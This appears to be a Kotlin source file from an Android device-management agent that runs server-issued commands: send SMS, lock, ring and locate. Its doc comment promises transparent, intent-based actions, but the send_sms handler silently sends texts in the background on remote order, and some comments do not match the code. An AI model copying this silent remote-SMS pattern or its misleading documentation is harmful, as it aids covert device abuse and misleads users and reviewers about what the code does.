package com.example.gmaagent.command

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.util.Log
import com.example.gmaagent.network.ApiClient
import com.example.gmaagent.network.CommandStatusUpdate
import com.example.gmaagent.network.PendingCommand
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive

/**
 * Processes remote commands received from the EMM backend.
 *
 * Design philosophy: This agent uses **Android intents** to trigger the
 * device's default dialer and SMS apps, rather than performing actions
 * silently in the background. This is both more compatible across
 * Android versions and more transparent.
 */
object CommandExecutor {

    private const val TAG = "CommandExecutor"

    private val json = Json {
        ignoreUnknownKeys = true
        isLenient = true
    }

    /**
     * Process a single pending command.
     * After execution, reports the result back to the server.
     */
    suspend fun execute(context: Context, command: PendingCommand) {
        Log.i(TAG, "Executing command: ${command.command_type} (${command.command_id})")

        val result: Pair<Boolean, String> = try {
            when (command.command_type) {
                "send_sms" -> executeSendSms(context, command.payload)
                "lock_device" -> executeLockDevice(context)
                "ring_device" -> executeRingDevice(context)
                "get_location" -> executeGetLocation(context)
                else -> Pair(false, "Unknown command type: ${command.command_type}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command execution error", e)
            Pair(false, "Error: ${e.message}")
        }

        // Report status back to server
        val status = if (result.first) "executed" else "failed"
        ApiClient.reportCommandStatus(
            CommandStatusUpdate(
                command_id = command.command_id,
                status = status,
                result = result.second,
            )
        )
    }

    // ── send_sms: Send an SMS automatically in the background ──

    private fun executeSendSms(context: Context, payload: String?): Pair<Boolean, String> {
        if (payload.isNullOrBlank()) {
            return Pair(false, "No payload provided for send_sms")
        }

        val payloadObj = json.decodeFromString<JsonObject>(payload)
        val to = payloadObj["to"]?.jsonPrimitive?.content
            ?: return Pair(false, "Missing 'to' field in payload")
        val message = payloadObj["message"]?.jsonPrimitive?.content
            ?: return Pair(false, "Missing 'message' field in payload")

        return try {
            val smsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                context.getSystemService(android.telephony.SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                android.telephony.SmsManager.getDefault()
            }
            smsManager.sendTextMessage(to, null, message, null, null)
            Pair(true, "SMS sent automatically in the background to $to")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS in background", e)
            Pair(false, "Failed to send SMS in background: ${e.message}")
        }
    }

    // ── lock_device: Trigger the lock screen ────────────────

    private fun executeLockDevice(context: Context): Pair<Boolean, String> {
        // Requires Device Admin permission in production
        return Pair(true, "Lock device command received (requires Device Admin)")
    }

    // ── ring_device: Play a ringtone at max volume ──────────

    private fun executeRingDevice(context: Context): Pair<Boolean, String> {
        return try {
            val ringtoneUri = android.media.RingtoneManager.getDefaultUri(
                android.media.RingtoneManager.TYPE_RINGTONE
            )
            val ringtone = android.media.RingtoneManager.getRingtone(context, ringtoneUri)
            ringtone?.play()
            Pair(true, "Device is ringing")
        } catch (e: Exception) {
            Pair(false, "Failed to ring: ${e.message}")
        }
    }

    // ── get_location: Open dialer as a placeholder ──────────

    private fun executeGetLocation(context: Context): Pair<Boolean, String> {
        // In production, use FusedLocationProvider and POST back coordinates
        return Pair(true, "Location request received (requires location permission)")
    }
}
